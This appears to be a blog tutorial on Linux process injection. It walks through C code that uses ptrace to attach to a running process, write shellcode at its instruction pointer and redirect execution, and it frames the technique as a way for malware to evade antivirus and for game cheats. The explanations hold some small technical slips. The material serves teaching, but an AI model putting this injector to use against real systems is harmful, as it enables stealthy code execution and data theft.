![Semantic description of image](https://github.com/MalavVyas/LinuxProcessInjection/raw/master/20200721_113241.jpg "Process Injection")
## Introduction:

Injection attacks have been in limelight since the initial days of the internet.
Let us dive into the specific type of injection, process injection which is hopefully going to be a multi part series.

Now, you must be wondering, what exactly is a process?

An instance of a running program is called process, everytime you run a program, such as opening your favourite browser to mail a co-worker or you open a game for blowing off some steam, a process is spawned.
As happens with everything, even a process can be manipulated, but in this scenario specific API calls of the operating system come to the rescue.

## What?

Process injection technique to infect legitimate binaries with not-so-legitimate code.
This is one of the many techniques employed within malwares to hide from a typical antivirus system.

## So what?

When employed perfectly, process injection improves stealth and in some cases also achieves persistant access to the compromised system.
This also leads to the attacker process leaking the sensitive information from a legitmate process.

A perfect example for this would be a wall-cheat program for computer video games.
If implemented correctly, User can inject their code inside the game to find out positions of other players, change his score, and do all other stuff with fellow players to make them scream at the game.

## How?

In possibly a series of articles on Process injection and code injection, I will try to demonstrate Process Injection on GNU/Linux as well as Microsoft Windows platforms

## Debuggers:

Consider you are a senior software engineer, working on a piece of software that will probably take humanity to the way beyond mars.
After a few cans of coffee and typing away at your keyboard, you are finished with the program but for a single error.
You read your code over and over again, copy-paste the error in a bunch of search engines but still can't find out the cause so you go to the **GNU Debugger** for help.

you set the breakpoint at the line 25 and code pauses right after executing line 24 and you can analyze all the registers, variables, stack and find the root of that error.

But why are debuggers so powerful to stop any process at any given time and facilitate the user to analyze everything? one word, **Ptrace**.

Every process contains unique pid which is a system-wide unique integer identifier assigned by the kernel
First of all, we need to find the pid of the process in concern, we can use following to find out pid:

`pgrep process_name`

After identifying the process and before extracting any information from the process, it's execution must be paused first.

We can use Ptrace syscall for the task

``` 	
The  ptrace() system call provides a means by which one process
(the "tracer") may observe and control the execution of another
process  (the  "tracee"),  and  examine and change the tracee's
memory and registers.  It is primarily used to implement break‐
point debugging and system call tracing. 
```

you can find more details on ptrace with man pages:

       `man ptrace`

Debuggers use **PTRACE_ATTACH** functionality of the ptrace to establish relationship between debugger and target process. It also stops the target process and allows debugger to read process memory and registers

To read the registers and also change their values, PTRACE_GETREGS and PTRACE_SETREGS comes to the rescue.

Okay, Ptrace seems like an innocent utility to help programmers, there is no way that can be used for malicious intents, right?


Let's look at our custom debugger C program

```
#include <sys/ptrace.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <unistd.h>
#include <linux/user.h> 

int main()
{   pid_t child;
    long orig_eax;
    child = fork();
    if(child == 0) {
        ptrace(PTRACE_TRACEME, 0, NULL, NULL);
        execl("/bin/ls", "ls", NULL);
    }
    else {
        wait(NULL);
        orig_eax = ptrace(PTRACE_PEEKUSER,
                          child, 4 * ORIG_EAX,
                          NULL);
        printf("The child made a "
               "system call %ld\n", orig_eax);
        ptrace(PTRACE_CONT, child, NULL, NULL);
    }
    return 0;
}
```
At first we defined various libraries containing important functions for our job.
then we defined pid_t structure for holding our process id, and long orig_eax for holding the value of register, after that we fork a child process "/bin/ls" with PTRACE_TRACEME.

According to the documentation, **" process can initiate a trace by calling fork(2) and having the resulting child do a PTRACE_TRACEME, followed (typically) by an execve(2)."**

so, here we fork a child process with **PTRACE_TRACEME** to debug it.

One thing to keep in mind, at low level processes execute **syscalls** to interact with the kernel.

Further moving along the code, we used **PTRACE_PEEKUSER, child, 4 * ORIG_EAX** to peek the value of the eax register which by generally contains the value of syscall to be execute and we print the syscall number and continue execution of the process with **PTRACE_CONT**

Let's dive into the snippet of the C program and work our way up to developing a malicious process injector

```

      #include<stdio.h>
      #include<stdlib.h>
      #include<string.h>
      #include<stdint.h>
      #include<sys/ptrace.h>
      #include<sys/types.h>
      #include<sys/wait.h>
      #include<unistd.h>

      #include<sys/user.h>
      #include<sys/reg.h>

      These are some libraries which contains required functions.

      int main(int argc, char *argv[]) {
      	pid_t target;
      	struct user_regs_struct regs;
      	int syscall;
      	long dst;
      }
      
```
Here we can see a portion of the main function which takes arguments.
We have defined some variables.

**pid_t** is a data type which is used to represent process ids.
**user_regs_struct** is a structure which will contain values of the registers
**syscall**, an integer for storing our syscall value and dst a long data type for storing our data
```
  if (argc != 2)
    {
      fprintf (stderr, "Usage:\n\t%s pid\n", argv[0]);
      exit (1);
    }
  target = atoi (argv[1]);
  printf ("+ Tracing process %d\n", target);
  if ((ptrace (PTRACE_ATTACH, target, NULL, NULL)) < 0)
    {
      perror ("ptrace(ATTACH):");
      exit (1);
    }
  printf ("+ Waiting for process...\n");
  wait (NULL);
```
Now, we check if the user has run the program while specifying **pid** as the argument and exit if otherwise.
Then convert the user supplied input pid to integer and further attach our program to the process with **PTRACE_ATTACH**

```
printf ("+ Getting Registers\n");
  if ((ptrace (PTRACE_GETREGS, target, NULL, &regs)) < 0)
    {
      perror ("ptrace(GETREGS):");
      exit (1);
    }

  printf ("+ Injecting shell code at %p\n", (void*)regs.rip);
  inject_data (target, shellcode, (void*)regs.rip, SHELLCODE_SIZE);
  regs.rip += 2;	      

```
We are attached to the process and we need to inject our code into the process.
In 64 Bit Architecture, register RIP contains the address of the next instruction to be executed.
Same way in 32 Bit, EIP contains the address of the next instruction to be executed.

So, now as we have the target process in paused state, we want to redirect the execution to our malicious code. But first we need to find out what instruction was going to be executed next.

Simple purpose of this will be to resume the target process after our malicious code is executed.

So, we need to get current state of the registers with **PTRACE_GETREGS** and store them in **&regs**.

**regs.rip** contains the value of RIP register.

 we then call the **inject_data** function with arguments, **target process**, **shellcode** to be injected, **address of the rip** and **size** of our shellcode


```
Int inject_data (pid_t pid, unsigned char *src, void *dst, int len)
{
  int      i;
  uint32_t *s = (uint32_t *) src;
  uint32_t *d = (uint32_t *) dst;
  for (i = 0; i < len; i+=4, s++, d++)
    {
      if ((ptrace (PTRACE_POKETEXT, pid, d, *s)) < 0)
	{
	  perror ("ptrace(POKETEXT):");
	  return -1;
	}
    }
  return 0;
}
```
here, **inject_data** function is defined, which takes **process_id** , **source pointer**, **destination pointer** and **length** as arguments

We have defined several variables.

here, for loop executes **PTRACE_POKETEXT** which writes data from destination to source, in this case destination being our process memory and source being our shellcode.

**POKETEXT** works on **words**, so everything is converted to word pointers of 32 bits and we also increase i with 4 in every iteration of the for loop

```
if ((ptrace (PTRACE_SETREGS, target, NULL, &regs)) < 0)
    {
      perror ("ptrace(GETREGS):");
      exit (1);
    }
  printf ("+ Run it!\n");
 
  if ((ptrace (PTRACE_DETACH, target, NULL, NULL)) < 0)
	{
	  perror ("ptrace(DETACH):");
	  exit (1);
	}
```
now that we have modified the process memory, we want to give control to that code with **PTRACE_SETREGS** and then Detach our program with **PTRACE_DETACH**

after calling inject_code you might have noticed **regs.rip += 2**

when we modify the instruction pointer, ptrace_detach subtracts 2 bytes from the instruction pointer (rip) so to compensate for that 2 byte loss, we add 2 to the **regs.rip**

To sum it up, we have our Process injector script ready, with simple shellcode to create a user 

Now, as our attacker program is ready we need a process to inject, for this purpose, we will spin up a quick c program

```
#include<stdio.h>
#include<unistd.h>

int main() {
	int i;

	printf ("PID: %d\n", (int)getpid());
	while(1==1){
		printf("working!\n");
		sleep(2);
	}
	getchar();
	return 0;

}
```

Here this program just prints it's process id so we don't have to find that out every time we run and then it keeps printing the string "working" every 2 second.

Let’s see working demo of how that’d work

<!-- blank line -->
<figure class="video_container">
  <iframe src="https://github.com/MalavVyas/LinuxProcessInjection/raw/master/ProcessInjectionDemo.mp4" frameborder="0" allowfullscreen="true"> </iframe>
</figure>
<!-- blank line -->
